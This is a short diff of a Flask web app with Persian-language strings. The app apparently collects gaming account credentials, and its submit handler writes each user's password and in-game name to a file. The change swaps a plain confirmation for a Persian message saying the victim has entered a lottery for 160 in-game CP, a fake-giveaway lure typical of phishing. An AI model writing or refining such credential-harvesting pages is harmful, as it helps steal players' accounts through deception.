@@ -68,7 +68,7 @@ def submit():
         f.write(f"رمز عبور: {password}\n")
         f.write(f"نام در بازی: {gamename}\n")
 
-    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید.")
+    return render_template('index.html', message="«تبریک! شما در قرعه‌کشی ویژه ثبت‌نام شدید. اگر نام شما در لیست برندگان قرار گیرد، تا چند ساعت آینده ۱۶۰ سی‌پی به اکانت شما اضافه خواهد شد. منتظر شگفتی باشید!»")
 
 # -------------------------------
 # کاربران و هش رمز عبور
@@ -123,3 +123,4 @@ def delete_file(filename):
 # -------------------------------
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+
